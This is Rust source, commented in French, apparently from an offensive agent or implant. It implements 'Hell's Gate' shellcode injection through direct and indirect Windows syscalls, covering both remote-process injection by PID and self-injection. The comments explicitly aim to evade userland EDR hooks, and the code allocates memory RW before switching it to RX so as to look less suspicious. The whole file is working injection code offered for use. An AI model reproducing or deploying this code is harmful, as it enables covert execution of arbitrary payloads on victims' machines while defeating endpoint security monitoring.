// ─────────────────────────────────────────────────────────────────────────────
// Injection via syscalls directs — remplace classic_inject
// ─────────────────────────────────────────────────────────────────────────────

/// MEM_COMMIT | MEM_RESERVE
const MEM_COMMIT_RESERVE: u32 = 0x1000 | 0x2000;
/// PAGE_READWRITE
const PAGE_READWRITE: u32 = 0x04;
/// PAGE_EXECUTE_READ
const PAGE_EXECUTE_READ: u32 = 0x20;
/// PROCESS_ALL_ACCESS
const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
/// THREAD_ALL_ACCESS
const THREAD_ALL_ACCESS: u32 = 0x001F03FF;

/// hellsgate_inject — injection de shellcode via direct syscalls (Hell's Gate)
///
/// Identique à classic_inject MAIS :
///   - N'appelle AUCUNE fonction hookée de ntdll
///   - Résout les SSN dynamiquement depuis la mémoire
///   - Exécute les syscalls directement (ring3 → ring0)
///   - Invisible pour tout hook userland EDR
///
/// Séquence :
///   1. NtOpenProcess           (au lieu de OpenProcess)
///   2. NtAllocateVirtualMemory (au lieu de VirtualAllocEx)
///   3. NtWriteVirtualMemory    (au lieu de WriteProcessMemory)
///   4. NtProtectVirtualMemory  (au lieu de VirtualProtectEx)
///   5. NtCreateThreadEx        (au lieu de CreateRemoteThread)
///   6. NtClose                 (cleanup)
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn hellsgate_inject(
    table: &SyscallTable,
    shellcode: &[u8],
    pid: u32,
) -> Result<u32, String> {
    // ── 1. NtOpenProcess ─────────────────────────────────────────────────────
    let entry_open = table.nt_open_process
        .as_ref()
        .ok_or("NtOpenProcess not resolved")?;

    // Préparer CLIENT_ID et OBJECT_ATTRIBUTES pour NtOpenProcess
    #[repr(C)]
    struct ClientId {
        unique_process: usize,
        unique_thread:  usize,
    }

    #[repr(C)]
    struct ObjectAttributes {
        length:                    u32,
        root_directory:            usize,
        object_name:               usize,
        attributes:                u32,
        security_descriptor:       usize,
        security_quality_of_service: usize,
    }

    let mut process_handle: isize = 0;
    let mut client_id = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };
    let mut obj_attr = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: 0,
        attributes: 0,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    // NtOpenProcess(handle, access, obj_attr, client_id)
    let status = do_indirect_syscall(
        entry_open,
        &mut process_handle as *mut _ as usize,
        PROCESS_ALL_ACCESS as usize,
        &mut obj_attr as *mut _ as usize,
        &mut client_id as *mut _ as usize,
    );

    if status != STATUS_SUCCESS {
        return Err(format!("NtOpenProcess failed: NTSTATUS 0x{:08X}", status as u32));
    }

    // ── 2. NtAllocateVirtualMemory (RW) ──────────────────────────────────────
    let mut base_addr: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut region_size: usize = shellcode.len();

    let status = nt_alloc(
        table,
        process_handle,
        &mut base_addr,
        0,
        &mut region_size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE, // Allouer RW d'abord (moins suspect)
    );

    if status != STATUS_SUCCESS {
        // Cleanup
        let entry_close = table.nt_close.as_ref().unwrap();
        do_indirect_syscall(entry_close, process_handle as usize, 0, 0, 0);
        return Err(format!("NtAllocateVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32));
    }

    // ── 3. NtWriteVirtualMemory ──────────────────────────────────────────────
    let mut bytes_written: usize = 0;

    let status = nt_write(
        table,
        process_handle,
        base_addr,
        shellcode.as_ptr() as *const _,
        shellcode.len(),
        &mut bytes_written,
    );

    if status != STATUS_SUCCESS {
        let entry_close = table.nt_close.as_ref().unwrap();
        do_indirect_syscall(entry_close, process_handle as usize, 0, 0, 0);
        return Err(format!("NtWriteVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32));
    }

    // ── 4. NtProtectVirtualMemory (RW → RX) ─────────────────────────────────
    let mut protect_base = base_addr;
    let mut protect_size = shellcode.len();
    let mut old_protect: u32 = 0;

    let status = nt_protect(
        table,
        process_handle,
        &mut protect_base,
        &mut protect_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );

    if status != STATUS_SUCCESS {
        let entry_close = table.nt_close.as_ref().unwrap();
        do_indirect_syscall(entry_close, process_handle as usize, 0, 0, 0);
        return Err(format!("NtProtectVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32));
    }

    // ── 5. NtCreateThreadEx ──────────────────────────────────────────────────
    let mut thread_handle: isize = 0;

    let status = nt_create_thread(
        table,
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        0,                     // ObjectAttributes = NULL
        process_handle,
        base_addr as *const _, // StartAddress = shellcode
        core::ptr::null(),     // Argument = NULL
        0,                     // CreateFlags = 0 (run immediately)
        0,                     // ZeroBits
        0,                     // StackSize (default)
        0,                     // MaxStackSize (default)
        0,                     // AttributeList = NULL
    );

    if status != STATUS_SUCCESS {
        let entry_close = table.nt_close.as_ref().unwrap();
        do_indirect_syscall(entry_close, process_handle as usize, 0, 0, 0);
        return Err(format!("NtCreateThreadEx failed: NTSTATUS 0x{:08X}", status as u32));
    }

    // ── 6. Cleanup ───────────────────────────────────────────────────────────
    if let Some(entry_close) = &table.nt_close {
        do_indirect_syscall(entry_close, thread_handle as usize, 0, 0, 0);
        do_indirect_syscall(entry_close, process_handle as usize, 0, 0, 0);
    }

    Ok(pid)
}

/// hellsgate_inject_local — injection dans le processus courant (self-injection)
///
/// Plus simple car pas besoin d'ouvrir un processus distant.
/// Utile pour exécuter du shellcode dans l'agent lui-même.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn hellsgate_inject_local(
    table: &SyscallTable,
    shellcode: &[u8],
) -> Result<(), String> {
    // Handle -1 = processus courant (NtCurrentProcess())
    let current_process: isize = -1;

    // 1. Allouer RW
    let mut base_addr: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut region_size: usize = shellcode.len();

    let status = nt_alloc(
        table,
        current_process,
        &mut base_addr,
        0,
        &mut region_size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    );

    if status != STATUS_SUCCESS {
        return Err(format!("NtAllocateVirtualMemory (local) failed: 0x{:08X}", status as u32));
    }

    // 2. Copier le shellcode (pas besoin de NtWriteVirtualMemory pour le processus local)
    core::ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        base_addr as *mut u8,
        shellcode.len(),
    );

    // 3. Changer RW → RX
    let mut protect_base = base_addr;
    let mut protect_size = shellcode.len();
    let mut old_protect: u32 = 0;

    let status = nt_protect(
        table,
        current_process,
        &mut protect_base,
        &mut protect_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );

    if status != STATUS_SUCCESS {
        return Err(format!("NtProtectVirtualMemory (local) failed: 0x{:08X}", status as u32));
    }

    // 4. Créer un thread local qui exécute le shellcode
    let mut thread_handle: isize = 0;

    let status = nt_create_thread(
        table,
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        0,
        current_process,
        base_addr as *const _,
        core::ptr::null(),
        0, 0, 0, 0, 0,
    );

    if status != STATUS_SUCCESS {
        return Err(format!("NtCreateThreadEx (local) failed: 0x{:08X}", status as u32));
    }

    // 5. Attendre la fin du thread (optionnel — dépend du use case)
    if let Some(entry_wait) = &table.nt_wait_for_single_object {
        // NtWaitForSingleObject(handle, alertable=FALSE, timeout=NULL → infini)
        do_indirect_syscall(entry_wait, thread_handle as usize, 0, 0, 0);
    }

    // Cleanup
    if let Some(entry_close) = &table.nt_close {
        do_indirect_syscall(entry_close, thread_handle as usize, 0, 0, 0);
    }

    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// Stubs fallback pour non-Windows
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn do_syscall(_ssn: u16, _a1: usize, _a2: usize, _a3: usize, _a4: usize) -> i32 {
    -1
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn do_indirect_syscall(_entry: &SyscallEntry, _a1: usize, _a2: usize, _a3: usize, _a4: usize) -> i32 {
    -1
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn hellsgate_inject(_table: &SyscallTable, _shellcode: &[u8], _pid: u32) -> Result<u32, String> {
    Err("Hell's Gate: Windows x64 only".into())
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn hellsgate_inject_local(_table: &SyscallTable, _shellcode: &[u8]) -> Result<(), String> {
    Err("Hell's Gate: Windows x64 only".into())
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn nt_alloc(
    _table: &SyscallTable, _ph: isize, _ba: *mut *mut core::ffi::c_void,
    _zb: usize, _rs: *mut usize, _at: u32, _p: u32,
) -> i32 { -1 }

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn nt_protect(
    _table: &SyscallTable, _ph: isize, _ba: *mut *mut core::ffi::c_void,
    _rs: *mut usize, _np: u32, _op: *mut u32,
) -> i32 { -1 }

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn nt_write(
    _table: &SyscallTable, _ph: isize, _ba: *mut core::ffi::c_void,
    _buf: *const core::ffi::c_void, _sz: usize, _bw: *mut usize,
) -> i32 { -1 }

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn nt_create_thread(
    _table: &SyscallTable, _th: *mut isize, _am: u32, _oa: usize,
    _ph: isize, _sa: *const core::ffi::c_void, _arg: *const core::ffi::c_void,
    _cf: u32, _zb: usize, _ss: usize, _mss: usize, _al: usize,
) -> i32 { -1 }
